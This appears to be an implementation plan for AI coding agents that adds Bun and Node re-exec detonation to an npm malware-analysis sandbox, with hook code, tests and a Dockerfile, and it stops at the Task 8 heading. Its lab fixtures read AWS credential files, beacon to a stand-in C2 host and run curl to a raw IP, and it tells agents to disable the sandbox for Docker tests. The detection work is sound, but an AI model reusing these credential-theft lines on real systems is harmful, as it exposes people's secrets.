# Bun / alt-runtime payload detonation — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Actually detonate bun-based (and node self-re-exec) npm payloads under instrumentation, so their runtime behavior is captured instead of silently neutered.

**Architecture:** Extract the harness hook logic into a shared `hooks-core.js` used by both a Node preload (`node -r`) and a new Bun preload (`bun --preload`). The `child_process` hook gains an allow-listed branch that *actually* re-execs `bun`/`node` when the target script resolves inside the sample — injecting our preload into the child and merging its events into the same log. A child registry + `waitForChildren` keeps the detonation alive until the real payload finishes.

**Tech Stack:** Python 3.13 (orchestrator), Node 22 + Bun (in-container harness, plain CommonJS JS), Docker, pytest.

## Global Constraints

- **Spec:** `docs/superpowers/specs/2026-07-08-bun-runtime-detonation-design.md`.
- **Allowlist (verbatim):** actually execute a spawn ONLY when the executable basename ∈ `{bun, bunx, node, nodejs}` AND the first non-flag argument resolves *inside* the sample dir (via `resolve-within.js`). Everything else stays neutered exactly as today.
- **Containment unchanged:** every existing `docker run` isolation flag stays (`--user 1000:1000`, `--cap-drop ALL`, `--security-opt no-new-privileges`, `--read-only`, `--memory 256m`, `--cpus 1`, `--pids-limit 128`, `--network none` or the internal sinkhole network). This plan adds NO capabilities and changes NO flag vector except a new `-e ANALYST_DETONATE_MS` env var.
- **Orchestrator never runs sample code:** Python only shells `docker` and reads JSON-lines as data. Unchanged.
- **Detonation wait:** `ANALYST_DETONATE_MS = max(1000, timeout*1000 − 2000)`.
- **Re-exec finding severity:** `high` for a `bun`/`bunx` target, `info` for a `node` target.
- **Bun version:** pinned via a `BUN_VERSION` Docker build arg (no floating `latest`).
- **Docker-gated tests:** per project memory, sandbox/Docker tests must be run with `dangerouslyDisableSandbox` or they skip silently.
- **Line endings:** repo enforces LF via `.gitattributes`; write new files with LF.

## File Structure

- Create `src/npm_ide_analyst/sandbox/harness/hooks-core.js` — all hook logic (extracted from `preload.js`) + re-exec branch + child registry + `waitForChildren`.
- Modify `src/npm_ide_analyst/sandbox/harness/preload.js` — becomes a thin `require('./hooks-core.js')`.
- Create `src/npm_ide_analyst/sandbox/harness/preload-bun.js` — `require('./hooks-core.js')` + Bun-native hooks (`Bun.spawn*`, global `fetch`).
- Modify `src/npm_ide_analyst/sandbox/harness/run-npm.js` — await `waitForChildren` before exit.
- Modify `src/npm_ide_analyst/sandbox/harness/run-vsix.js` — await `waitForChildren` before exit.
- Modify `src/npm_ide_analyst/sandbox/orchestrator.py` — pass `-e ANALYST_DETONATE_MS` in all three transports.
- Modify `src/npm_ide_analyst/sandbox/findings.py` — map the `runtime-reexec` event kind.
- Modify `src/npm_ide_analyst/sandbox/docker/Dockerfile` — install pinned Bun.
- Create `tests/test_harness_reexec.py` — no-Docker unit test of the node re-exec pipeline.
- Create `tests/test_bun_detonation.py` — Docker-gated end-to-end bun-loader test + neuter regression.
- Create `tests/fixtures/bun_loader/` — synthetic bun-loader sample fixture.
- Modify `tests/test_orchestrator_*` (new small test) — `_detonate_ms` helper + env wiring.

---

### Task 1: Extract `hooks-core.js` (pure refactor)

**Files:**
- Create: `src/npm_ide_analyst/sandbox/harness/hooks-core.js`
- Modify: `src/npm_ide_analyst/sandbox/harness/preload.js`
- Create: `src/npm_ide_analyst/sandbox/harness/preload-bun.js`
- Test: `tests/test_harness_hooks.py` (existing — must stay green)

**Interfaces:**
- Produces: `hooks-core.js` runs all hooks on `require`. `preload.js` and `preload-bun.js` each `require('./hooks-core.js')`. (Task 2 adds `module.exports`.)

- [ ] **Step 1: Move preload body into hooks-core.js**

Copy the *entire current contents* of `preload.js` (lines 1–157) verbatim into a new file `src/npm_ide_analyst/sandbox/harness/hooks-core.js`. Change the top comment to:

```js
// src/npm_ide_analyst/sandbox/harness/hooks-core.js
// Shared detonation hooks, required by preload.js (node -r) and
// preload-bun.js (bun --preload).
'use strict';
```

(Everything else in the file — the child_process/http/net/dns/fs/Buffer/eval/Function hooks and the final `emit('harness', 'preload installed', {})` — stays byte-for-byte identical for now.)

- [ ] **Step 2: Reduce preload.js to a thin require**

Replace the entire contents of `src/npm_ide_analyst/sandbox/harness/preload.js` with:

```js
// src/npm_ide_analyst/sandbox/harness/preload.js
// Node entrypoint (injected via `node -r`). All logic lives in hooks-core.js.
'use strict';
require('./hooks-core.js');
```

- [ ] **Step 3: Create the bun entrypoint stub**

Create `src/npm_ide_analyst/sandbox/harness/preload-bun.js`:

```js
// src/npm_ide_analyst/sandbox/harness/preload-bun.js
// Bun entrypoint (injected via `bun --preload`). Shares hooks-core.js;
// Bun-native hooks (Bun.spawn*, global fetch) are added in a later task.
'use strict';
require('./hooks-core.js');
```

- [ ] **Step 4: Run the existing harness tests to verify no behavior change**

Run: `python -m pytest tests/test_harness_hooks.py tests/test_harness_entrypoints.py tests/test_harness_sinkhole.py -v`
Expected: PASS (same as before the refactor — `preload.js` now sources `hooks-core.js`).

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/sandbox/harness/hooks-core.js src/npm_ide_analyst/sandbox/harness/preload.js src/npm_ide_analyst/sandbox/harness/preload-bun.js
git commit -m "refactor: extract harness hooks into shared hooks-core.js"
```

---

### Task 2: Allow-listed re-exec + child registry + `waitForChildren` (node path)

**Files:**
- Modify: `src/npm_ide_analyst/sandbox/harness/hooks-core.js`
- Modify: `src/npm_ide_analyst/sandbox/harness/run-npm.js`
- Modify: `src/npm_ide_analyst/sandbox/harness/run-vsix.js`
- Test: `tests/test_harness_reexec.py` (create)

**Interfaces:**
- Consumes: `resolveWithin(dir, rel)` from `resolve-within.js`; `emit` from `emit.js`.
- Produces: `hooks-core.js` exports `{ waitForChildren, reexecPlan, runReexec, registerChild }`.
  - `reexecPlan(file: string, argvArray: string[]) -> {runtime:'bun'|'node', file:string, args:string[], target:string} | null`
  - `runReexec(plan, {sync:boolean, callerEnv?:object}) -> ChildProcess | SpawnSyncReturns` (also registers async children)
  - `registerChild(cp: ChildProcess) -> void`
  - `waitForChildren(deadlineMs: number) -> Promise<void>`

- [ ] **Step 1: Write the failing test**

Create `tests/test_harness_reexec.py`:

```python
import json
import os
import shutil
import subprocess
from pathlib import Path

import pytest

HARNESS = Path("src/npm_ide_analyst/sandbox/harness")
pytestmark = pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")


def _run_sample(tmp_path: Path, files: dict[str, str]) -> list[dict]:
    """Lay down a sample dir + driver that re-execs an in-sample script under
    the preload, run it via run-npm.js, and return merged events."""
    sample = tmp_path / "sample"
    sample.mkdir()
    for name, body in files.items():
        (sample / name).write_text(body, encoding="utf-8")
    log = tmp_path / "events.jsonl"
    preload = (HARNESS / "preload.js").resolve()
    runner = (HARNESS / "run-npm.js").resolve()
    env = {
        **os.environ,
        "ANALYST_EVENT_LOG": str(log),
        "ANALYST_SAMPLE_DIR": str(sample),
        "ANALYST_DETONATE_MS": "8000",
    }
    subprocess.run(["node", "-r", str(preload), str(runner)],
                   env=env, timeout=30, capture_output=True)
    return ([json.loads(l) for l in log.read_text().splitlines() if l.strip()]
            if log.exists() else [])


def test_node_reexec_of_in_sample_script_runs_and_merges(tmp_path):
    # preinstall spawns `node child.js`; child.js reads a canary (hooked as a
    # 'file'/'secret' event). If the re-exec truly ran under our preload, the
    # child's event appears in the SAME merged log.
    events = _run_sample(tmp_path, {
        "package.json": json.dumps({
            "name": "reexec-fixture", "version": "1.0.0",
            "scripts": {"preinstall": "node scripts.js"},
        }),
        "scripts.js": (
            "const cp=require('child_process');\n"
            "cp.spawn('node',['child.js'],{stdio:'ignore'});\n"
        ),
        "child.js": (
            "try{require('fs').readFileSync('/root/.aws/credentials')}catch(e){}\n"
            "require('child_process').execSync('echo from-child');\n"
        ),
    })
    # The re-exec itself is announced.
    assert any(e["kind"] == "runtime-reexec" and "node" in e["detail"] for e in events)
    # The CHILD's hooked behavior reached the merged log (proves it ran hooked).
    assert any(e["kind"] in ("file", "secret") and "credentials" in e["detail"]
               for e in events), "child re-exec did not run under instrumentation"


def test_non_allowlisted_spawn_stays_neutered(tmp_path):
    # `curl` is not a JS runtime -> must stay a neutered 'process' event, and
    # `node ../escape.js` (outside the sample) must NOT be re-exec'd.
    events = _run_sample(tmp_path, {
        "package.json": json.dumps({
            "name": "neuter-fixture", "version": "1.0.0",
            "scripts": {"preinstall": "node scripts.js"},
        }),
        "scripts.js": (
            "const cp=require('child_process');\n"
            "cp.exec('curl http://1.2.3.4/x',()=>{});\n"
            "cp.spawn('node',['../escape.js'],{stdio:'ignore'});\n"
        ),
    })
    assert any(e["kind"] == "process" and "curl" in e["detail"] for e in events)
    assert not any(e["kind"] == "runtime-reexec" for e in events), \
        "out-of-sample or non-runtime spawn was wrongly re-exec'd"
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `python -m pytest tests/test_harness_reexec.py -v`
Expected: FAIL — no `runtime-reexec` events (current code neuters all spawns; child never runs).

- [ ] **Step 3: Add re-exec helpers + child registry to hooks-core.js**

At the **top** of `hooks-core.js`, after the existing `const { traceExec } = require('./trace.js');` line, add:

```js
const path = require('path');
const { resolveWithin } = require('./resolve-within.js');
const SAMPLE_DIR = process.env.ANALYST_SAMPLE_DIR || '/work/sample';
const RUNTIMES = new Set(['bun', 'bunx', 'node', 'nodejs']);

// Real (unpatched) spawns captured before the child_process loop patches them.
const _realCp = require('child_process');
const REAL_SPAWN = _realCp.spawn;
const REAL_SPAWN_SYNC = _realCp.spawnSync;

// --- live re-exec'd children, awaited before the runner exits ---
const _children = [];
function registerChild(child) {
  _children.push(new Promise((resolve) => {
    let done = false;
    const fin = () => { if (!done) { done = true; resolve(); } };
    child.on('exit', fin);
    child.on('close', fin);
    child.on('error', fin);
  }));
}
async function waitForChildren(deadlineMs) {
  if (_children.length === 0) return;
  let timer;
  const deadline = new Promise((r) => { timer = setTimeout(r, Number(deadlineMs) || 8000); });
  await Promise.race([Promise.allSettled(_children), deadline]);
  clearTimeout(timer);
}

// Naive whitespace tokenizer for exec()/execSync() string commands.
function tokenize(cmdStr) {
  return String(cmdStr).trim().split(/\s+/).filter(Boolean);
}

// Decide whether (file, argv) is an allow-listed JS-runtime re-exec of an
// in-sample script. Returns a rewrite plan or null (=> stay neutered).
function reexecPlan(file, argv) {
  const base = path.basename(String(file || '')).replace(/\.exe$/i, '');
  if (!RUNTIMES.has(base)) return null;
  const args = Array.isArray(argv) ? argv.map(String) : [];
  const script = args.find((a) => !a.startsWith('-'));
  if (!script) return null;
  const target = resolveWithin(SAMPLE_DIR, script);
  if (!target) return null;
  const runtime = (base === 'bun' || base === 'bunx') ? 'bun' : 'node';
  // Derive preload paths from this file's dir so they resolve BOTH in-container
  // (/harness) and in the no-Docker unit test (repo .../harness). Replace the
  // (possibly relative) script arg with its absolute resolved path so the child
  // finds it regardless of its cwd.
  const inject = runtime === 'bun'
    ? ['--preload', path.join(__dirname, 'preload-bun.js')]
    : ['-r', path.join(__dirname, 'preload.js')];
  const idx = args.indexOf(script);
  const finalArgs = [...args.slice(0, idx), ...inject, target, ...args.slice(idx + 1)];
  return { runtime, file: base, args: finalArgs, target };
}

// Force our ANALYST_* env into the child regardless of caller-supplied env.
function childEnv(callerEnv) {
  const e = Object.assign({}, callerEnv || process.env);
  for (const k of ['ANALYST_SAMPLE_DIR', 'ANALYST_EVENT_LOG', 'ANALYST_SINKHOLE',
                   'ANALYST_TRACE_NATIVE', 'ANALYST_DETONATE_MS']) {
    if (process.env[k] !== undefined) e[k] = process.env[k];
  }
  return e;
}

// Actually run an allow-listed re-exec under our preload. stdio is forced so
// the child's event stream reaches us: in file-log mode it writes to the shared
// ANALYST_EVENT_LOG; in stream mode (ANALYST_EVENT_LOG="") emit -> stdout, which
// we inherit to the parent's stdout.
function runReexec(plan, { sync, callerEnv }) {
  const opts = { env: childEnv(callerEnv), stdio: ['ignore', 'inherit', 'inherit'] };
  emit('runtime-reexec', `${plan.runtime} ${plan.target}`,
       { runtime: plan.runtime, script: plan.target });
  if (sync) {
    REAL_SPAWN_SYNC(plan.file, plan.args, opts);
    return Buffer.from(''); // execSync/spawnSync callers expect a Buffer/result
  }
  const child = REAL_SPAWN(plan.file, plan.args, opts);
  registerChild(child);
  return child;
}
```

- [ ] **Step 4: Route the child_process wrapper through the re-exec branch**

Replace the existing child_process loop in `hooks-core.js` (the `for (const fn of ['exec', 'execSync', 'spawn', ...])` block) with:

```js
// --- child_process: allow-listed re-exec, else log + neuter ---
const cp = require('child_process');
for (const fn of ['exec', 'execSync', 'spawn', 'spawnSync', 'execFile', 'execFileSync', 'fork']) {
  if (typeof cp[fn] !== 'function') continue;
  const orig = cp[fn];
  const isSync = fn.endsWith('Sync');
  cp[fn] = function (...args) {
    // Derive (file, argv) for the allowlist check.
    let file = null;
    let argv = [];
    if (fn === 'exec' || fn === 'execSync') {
      const toks = tokenize(args[0]);
      file = toks[0];
      argv = toks.slice(1);
    } else if (fn !== 'fork') {
      file = args[0];
      argv = Array.isArray(args[1]) ? args[1] : [];
    }
    const plan = fn !== 'fork' ? reexecPlan(file, argv) : null;
    if (plan) {
      const callerOpts = args.find((a) => a && typeof a === 'object' && !Array.isArray(a));
      return runReexec(plan, { sync: isSync, callerEnv: callerOpts && callerOpts.env });
    }
    // Not allow-listed: existing behavior (log + trace-native | neuter).
    emit('process', `${fn}: ${JSON.stringify(args[0])}`, { fn, args: args.slice(0, 2) });
    if (TRACE_NATIVE && fn !== 'fork') {
      return traceExec(fn, args, orig);
    }
    if (isSync) return Buffer.from('');
    const cb = args.find((a) => typeof a === 'function');
    if (cb) process.nextTick(() => cb(null, '', ''));
    const { EventEmitter } = require('events');
    const stub = new EventEmitter();
    stub.stdout = new EventEmitter();
    stub.stderr = new EventEmitter();
    stub.kill = () => {};
    return stub;
  };
}
```

- [ ] **Step 5: Export the API from hooks-core.js**

At the very **end** of `hooks-core.js` (after `emit('harness', 'preload installed', {})`), add:

```js
module.exports = { waitForChildren, reexecPlan, runReexec, registerChild };
```

- [ ] **Step 6: Await children in run-npm.js**

In `src/npm_ide_analyst/sandbox/harness/run-npm.js`: add the import near the other requires (after line 7):

```js
const { waitForChildren } = require('./hooks-core.js');
```

Change `main()` from synchronous to async and replace the final two lines (`main();` and `setTimeout(() => process.exit(0), 200);`) so the runner waits for re-exec'd children:

```js
async function main() {
  const dir = process.env.ANALYST_SAMPLE_DIR || '/work/sample';
  emit('detonation', 'npm detonation start', { dir });
  // ... (body unchanged) ...
  emit('detonation', 'npm detonation end', {});
  const deadline = Number(process.env.ANALYST_DETONATE_MS) || 8000;
  await waitForChildren(deadline);
}
main().then(() => setTimeout(() => process.exit(0), 200));
```

(Keep the entire existing body of `main()` between the start/end emits verbatim — only the function signature, the trailing `waitForChildren` await, and the bottom invocation change.)

- [ ] **Step 7: Await children in run-vsix.js**

In `src/npm_ide_analyst/sandbox/harness/run-vsix.js`: add after line 8:

```js
const { waitForChildren } = require('./hooks-core.js');
```

Replace the final `emit('detonation', 'vsix detonation end', {});` + bottom line. The end-emit stays; insert the wait right after it, and update the bottom invocation:

```js
  emit('detonation', 'vsix detonation end', {});
  const deadline = Number(process.env.ANALYST_DETONATE_MS) || 8000;
  await waitForChildren(deadline);
}
main().then(() => setTimeout(() => process.exit(0), 200));
```

- [ ] **Step 8: Run the new + existing harness tests**

Run: `python -m pytest tests/test_harness_reexec.py tests/test_harness_hooks.py tests/test_harness_entrypoints.py -v`
Expected: PASS — re-exec test now sees `runtime-reexec` + the child's `secret`/`file` event; neuter regression still passes; no existing hook test regressed.

- [ ] **Step 9: Commit**

```bash
git add src/npm_ide_analyst/sandbox/harness/hooks-core.js src/npm_ide_analyst/sandbox/harness/run-npm.js src/npm_ide_analyst/sandbox/harness/run-vsix.js tests/test_harness_reexec.py
git commit -m "feat: actually detonate allow-listed bun/node re-execs under instrumentation"
```

---

### Task 3: `ANALYST_DETONATE_MS` from the orchestrator

**Files:**
- Modify: `src/npm_ide_analyst/sandbox/orchestrator.py`
- Test: `tests/test_detonation_flags.py` (existing — append a test)

**Interfaces:**
- Produces: `_detonate_ms(timeout: int) -> int` helper; all three transports emit `-e ANALYST_DETONATE_MS=<n>` into the container.

- [ ] **Step 1: Write the failing test**

Append to `tests/test_detonation_flags.py`:

```python
from npm_ide_analyst.sandbox.orchestrator import _detonate_ms


def test_detonate_ms_derives_from_timeout():
    assert _detonate_ms(30) == 28000        # 30*1000 - 2000
    assert _detonate_ms(1) == 1000          # floor at 1000
    assert _detonate_ms(0) == 1000          # floor
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `python -m pytest tests/test_detonation_flags.py::test_detonate_ms_derives_from_timeout -v`
Expected: FAIL — `ImportError: cannot import name '_detonate_ms'`.

- [ ] **Step 3: Add the helper and wire it into all three transports**

In `orchestrator.py`, add the helper near `run_flags` (after line 52):

```python
def _detonate_ms(timeout: int) -> int:
    """Milliseconds the harness waits for re-exec'd children before exiting.

    Leaves ~2s slack under the orchestrator's ``timeout + 15s`` hard kill; never
    below 1s so a zero/negative timeout still yields a valid deadline.
    """
    return max(1000, int(timeout) * 1000 - 2000)
```

Then add `-e ANALYST_DETONATE_MS` to each transport's `cmd`:

In `_detonate_via_stream`, in the `cmd = [...]` list, immediately after the `"-e", "ANALYST_EVENT_LOG=",` entry, add:

```python
        "-e", f"ANALYST_DETONATE_MS={_detonate_ms(timeout)}",
```

In `_detonate_isolated`, in the `cmd = [...]` list, immediately after the `"-e", "ANALYST_EVENT_LOG=/work/hostout/events.jsonl",` entry, add:

```python
            "-e", f"ANALYST_DETONATE_MS={_detonate_ms(timeout)}",
```

(`_detonate_with_sinkhole` calls `_detonate_isolated`, so it inherits the env automatically — no separate change.)

- [ ] **Step 4: Run the test to verify it passes**

Run: `python -m pytest tests/test_detonation_flags.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/sandbox/orchestrator.py tests/test_detonation_flags.py
git commit -m "feat: pass ANALYST_DETONATE_MS into detonation containers"
```

---

### Task 4: Map the `runtime-reexec` event to a finding

**Files:**
- Modify: `src/npm_ide_analyst/sandbox/findings.py`
- Test: `tests/test_sandbox_findings.py` (existing — append tests)

**Interfaces:**
- Consumes: `BehaviorEvent(kind="runtime-reexec", detail=..., data={"runtime": "bun"|"node", "script": ...})`.
- Produces: a `Finding` with category `runtime-reexec`, severity `HIGH` for bun/bunx else `INFO`.

- [ ] **Step 1: Write the failing test**

Append to `tests/test_sandbox_findings.py`:

```python
from npm_ide_analyst.models import BehaviorEvent, Severity
from npm_ide_analyst.sandbox.findings import behavior_to_findings


def test_runtime_reexec_bun_is_high():
    evs = [BehaviorEvent(kind="runtime-reexec",
                         detail="bun /work/sample/bun_environment.js",
                         data={"runtime": "bun", "script": "/work/sample/bun_environment.js"})]
    fs = behavior_to_findings(evs)
    assert len(fs) == 1
    assert fs[0].category == "runtime-reexec"
    assert fs[0].severity == Severity.HIGH


def test_runtime_reexec_node_is_info():
    evs = [BehaviorEvent(kind="runtime-reexec",
                         detail="node /work/sample/child.js",
                         data={"runtime": "node", "script": "/work/sample/child.js"})]
    fs = behavior_to_findings(evs)
    assert len(fs) == 1
    assert fs[0].severity == Severity.INFO
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `python -m pytest tests/test_sandbox_findings.py -k runtime_reexec -v`
Expected: FAIL — `runtime-reexec` is not in `_MAP`, so `behavior_to_findings` returns `[]`.

- [ ] **Step 3: Special-case runtime-reexec in behavior_to_findings**

In `findings.py`, inside the loop in `behavior_to_findings`, add a branch BEFORE the `mapping = _MAP.get(ev.kind)` lookup:

```python
    for ev in events:
        if ev.kind == "runtime-reexec":
            runtime = (ev.data or {}).get("runtime", "")
            severity = Severity.HIGH if runtime in ("bun", "bunx") else Severity.INFO
            category = "runtime-reexec"
            title = "Payload handed to a JS runtime and detonated under instrumentation"
            key = (category, ev.detail)
            if key in seen:
                continue
            seen[key] = Finding(
                id=f"DYN-{category}-{len(seen)}",
                title=title,
                severity=severity,
                category=category,
                detail=f"{title}: {ev.detail}",
                location="[dynamic]",
                evidence=ev.detail,
            )
            continue
        mapping = _MAP.get(ev.kind)
        if mapping is None:
            continue
        # ... rest unchanged ...
```

- [ ] **Step 4: Run the test to verify it passes**

Run: `python -m pytest tests/test_sandbox_findings.py -v`
Expected: PASS (both new tests + existing ones).

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/sandbox/findings.py tests/test_sandbox_findings.py
git commit -m "feat: surface runtime-reexec as a finding (high for bun, info for node)"
```

---

### Task 5: Install pinned Bun in the sandbox image

**Files:**
- Modify: `src/npm_ide_analyst/sandbox/docker/Dockerfile`
- Test: `tests/test_bun_detonation.py` (create — image build + `bun --version` check)

**Interfaces:**
- Produces: the sandbox image has `bun` on PATH for uid 1000 at the pinned `BUN_VERSION`.

- [ ] **Step 1: Write the failing test**

Create `tests/test_bun_detonation.py` with the build/version check (more tests appended in Task 7):

```python
import shutil
import subprocess

import pytest

from npm_ide_analyst.sandbox.orchestrator import IMAGE_TAG, build_image, docker_available

pytestmark = pytest.mark.skipif(not docker_available(), reason="docker unavailable")


@pytest.fixture(scope="module")
def image():
    build_image(assume_docker=True)
    return IMAGE_TAG


def test_bun_is_installed_in_image(image):
    r = subprocess.run(
        ["docker", "run", "--rm", "--entrypoint", "bun", image, "--version"],
        capture_output=True, timeout=60, text=True,
    )
    assert r.returncode == 0, r.stderr
    assert r.stdout.strip(), "bun --version produced no output"
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `python -m pytest tests/test_bun_detonation.py::test_bun_is_installed_in_image -v` (with `dangerouslyDisableSandbox`)
Expected: FAIL — `bun` is not in the image (`--entrypoint bun` errors, non-zero rc).

- [ ] **Step 3: Add Bun to the Dockerfile**

In `src/npm_ide_analyst/sandbox/docker/Dockerfile`, after the `strace` install block (after line 9) and before the `useradd` line, add:

```dockerfile
# Pinned Bun runtime. A real npm supply-chain family (e.g. tiaan) runs its
# payload under bun to evade node-only instrumentation; the harness re-execs
# those payloads under bun --preload, so bun must be baked in at build time
# (runtime is offline). Pinned for reproducibility; no floating "latest".
ARG BUN_VERSION=1.1.45
RUN apt-get update \
 && apt-get install -y --no-install-recommends curl unzip ca-certificates \
 && rm -rf /var/lib/apt/lists/* \
 && curl -fsSL "https://github.com/oven-sh/bun/releases/download/bun-v${BUN_VERSION}/bun-linux-x64.zip" -o /tmp/bun.zip \
 && unzip -q /tmp/bun.zip -d /tmp/bun \
 && install -m 0755 /tmp/bun/bun-linux-x64/bun /usr/local/bin/bun \
 && ln -sf /usr/local/bin/bun /usr/local/bin/bunx \
 && rm -rf /tmp/bun.zip /tmp/bun \
 && test "$(bun --version)" = "${BUN_VERSION}"
```

(If `BUN_VERSION` needs updating to a currently-published release, adjust the `ARG` default; the `test` line fails the build on a mismatch.)

- [ ] **Step 4: Rebuild and run the test to verify it passes**

Run: `python -m pytest tests/test_bun_detonation.py::test_bun_is_installed_in_image -v` (with `dangerouslyDisableSandbox`)
Expected: PASS — `bun --version` works inside the image.

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/sandbox/docker/Dockerfile tests/test_bun_detonation.py
git commit -m "feat: bake pinned bun into the sandbox image"
```

---

### Task 6: Bun-native hooks in `preload-bun.js`

**Files:**
- Modify: `src/npm_ide_analyst/sandbox/harness/preload-bun.js`
- Test: covered by Task 7's end-to-end fixture (needs bun; no isolated unit test).

**Interfaces:**
- Consumes: `reexecPlan`, `runReexec` from `hooks-core.js`; `emit` from `emit.js`.
- Produces: under Bun, `Bun.spawn`/`Bun.spawnSync` follow the same allowlist/neuter path, and global `fetch` is logged + neutered (or delegated to the sinkhole).

- [ ] **Step 1: Add Bun-native hooks**

Replace the contents of `src/npm_ide_analyst/sandbox/harness/preload-bun.js` with:

```js
// src/npm_ide_analyst/sandbox/harness/preload-bun.js
// Bun entrypoint (injected via `bun --preload`). Shares hooks-core.js and adds
// Bun-native hooks (Bun.spawn*, global fetch) that node-compat hooks don't cover.
'use strict';
const { reexecPlan, runReexec, registerChild } = require('./hooks-core.js');
const { emit } = require('./emit.js');

// --- Bun.spawn / Bun.spawnSync: allow-listed re-exec, else log + neuter ---
if (typeof globalThis.Bun !== 'undefined' && Bun && typeof Bun.spawn === 'function') {
  const wrap = (name, sync) => {
    const orig = Bun[name];
    if (typeof orig !== 'function') return;
    Bun[name] = function (cmd, opts) {
      // Bun.spawn(["bun","x.js"], opts) or Bun.spawn({cmd:["bun","x.js"], ...}).
      const argv = Array.isArray(cmd) ? cmd.map(String)
                 : (cmd && Array.isArray(cmd.cmd)) ? cmd.cmd.map(String) : [];
      const plan = reexecPlan(argv[0], argv.slice(1));
      if (plan) {
        // runReexec uses node child_process (also hooked under bun) so events
        // and child-registry/waitForChildren behave identically.
        return runReexec(plan, { sync });
      }
      emit('process', `Bun.${name}: ${JSON.stringify(argv[0])}`, { fn: `Bun.${name}`, args: argv.slice(0, 2) });
      // Neuter: return a benign stub with the shape callers expect.
      if (sync) return { exitCode: 0, stdout: Buffer.from(''), stderr: Buffer.from(''), success: true };
      return { pid: -1, exited: Promise.resolve(0), kill() {}, stdout: null, stderr: null };
    };
  };
  wrap('spawn', false);
  wrap('spawnSync', true);
}

// --- global fetch: log + (neuter | sinkhole-delegate) ---
if (typeof globalThis.fetch === 'function') {
  const origFetch = globalThis.fetch;
  globalThis.fetch = function (input, init) {
    const url = typeof input === 'string' ? input : (input && input.url) || String(input);
    emit('network', `fetch: ${url}`, { scheme: 'fetch', url: String(url) });
    if (process.env.ANALYST_SINKHOLE) {
      return origFetch(input, init); // real fetch -> sinkhole captures the dialog
    }
    return Promise.reject(new Error('network neutered')); // no socket opened
  };
}
```

(Note: `runReexec`/`registerChild` route through node's `child_process`, which Bun implements and `hooks-core.js` already hooks, so re-exec + `waitForChildren` work the same under Bun. `registerChild` is imported for parity but invoked inside `runReexec`.)

- [ ] **Step 2: Sanity-check the file parses under node**

Run: `node --check src/npm_ide_analyst/sandbox/harness/preload-bun.js`
Expected: no output, exit 0 (syntactic validity; runtime behavior verified in Task 7).

- [ ] **Step 3: Commit**

```bash
git add src/npm_ide_analyst/sandbox/harness/preload-bun.js
git commit -m "feat: bun-native Bun.spawn* + fetch hooks in preload-bun.js"
```

---

### Task 7: End-to-end bun-loader detonation test

**Files:**
- Create: `tests/fixtures/bun_loader/package.json`
- Create: `tests/fixtures/bun_loader/setup_bun.js`
- Create: `tests/fixtures/bun_loader/payload.js`
- Modify: `tests/test_bun_detonation.py` (append the end-to-end + neuter tests)

**Interfaces:**
- Consumes: `detonate(payload_root, ArtifactType.PACKAGE, ...)` from `orchestrator.py`; the built image from Task 5.

- [ ] **Step 1: Create the synthetic bun-loader fixture**

`tests/fixtures/bun_loader/package.json`:

```json
{
  "name": "bun-loader-fixture",
  "version": "1.0.0",
  "description": "Synthetic bun-loader: preinstall spawns bun to run the payload.",
  "main": "index.js",
  "scripts": { "preinstall": "node setup_bun.js" }
}
```

`tests/fixtures/bun_loader/setup_bun.js`:

```js
// LAB ARTIFACT — mirrors the tiaan family's evasion: hand the real payload to
// bun so a node-only sandbox never sees it. Not real malware.
'use strict';
const cp = require('child_process');
try { cp.execSync('which bun', { stdio: 'ignore' }); } catch (e) {}
cp.spawn('bun', ['payload.js'], { stdio: 'ignore' });
```

`tests/fixtures/bun_loader/payload.js`:

```js
// LAB ARTIFACT — runs under bun. Reads a canary secret and beacons out. All
// operations are neutered/sinkholed by the harness; nothing real is contacted.
'use strict';
const fs = require('fs');
try { fs.readFileSync('/home/analyst/.aws/credentials', 'utf8'); } catch (e) {}
fetch('https://c2.example.test/collect').catch(() => {});
```

- [ ] **Step 2: Write the failing end-to-end + neuter tests**

Append to `tests/test_bun_detonation.py`:

```python
from pathlib import Path

from npm_ide_analyst.models import ArtifactType
from npm_ide_analyst.sandbox.orchestrator import detonate

FIXTURE = Path("tests/fixtures/bun_loader")


def test_bun_payload_is_detonated_under_instrumentation(image):
    events = detonate(FIXTURE, ArtifactType.PACKAGE, timeout=30, assume_docker=True)
    kinds = {(e.kind, e.detail) for e in events}
    # The re-exec into bun is announced...
    assert any(k == "runtime-reexec" and "bun" in d for k, d in kinds), \
        f"no bun runtime-reexec captured; got {sorted(kinds)}"
    # ...and the bun PAYLOAD's own behavior (secret read under bun) was captured,
    # proving the payload ran hooked rather than invisibly.
    assert any(e.kind in ("secret", "file") and "credentials" in e.detail
               for e in events), "bun payload's secret read was not captured"


def test_bun_payload_network_is_captured_and_neutered(image):
    # --network none: the payload's fetch is logged (visibility) but never opens
    # a socket. We assert the fetch target was recorded.
    events = detonate(FIXTURE, ArtifactType.PACKAGE, timeout=30, assume_docker=True)
    assert any(e.kind == "network" and "c2.example.test" in e.detail
               for e in events), "bun payload's fetch target was not captured"
```

- [ ] **Step 3: Run the tests to verify they fail (before the image has bun / hooks wired)**

Run: `python -m pytest tests/test_bun_detonation.py -v` (with `dangerouslyDisableSandbox`)
Expected: with Tasks 1–6 already committed and the image rebuilt, these should actually PASS. If run against a pre-Task-6 image they FAIL (no `runtime-reexec`, no payload events). Rebuild the image first: the `image` fixture calls `build_image`.

- [ ] **Step 4: Rebuild the image and run the full bun suite**

Run: `python -m pytest tests/test_bun_detonation.py -v` (with `dangerouslyDisableSandbox`)
Expected: PASS — image has bun, the loader's `spawn('bun', ['payload.js'])` is re-exec'd under `preload-bun.js`, and the payload's secret-read + fetch events appear in the merged log.

- [ ] **Step 5: Commit**

```bash
git add tests/fixtures/bun_loader tests/test_bun_detonation.py
git commit -m "test: end-to-end bun-loader detonation + neuter regression"
```

---

### Task 8: Full regression + documentation touch-up

**Files:**
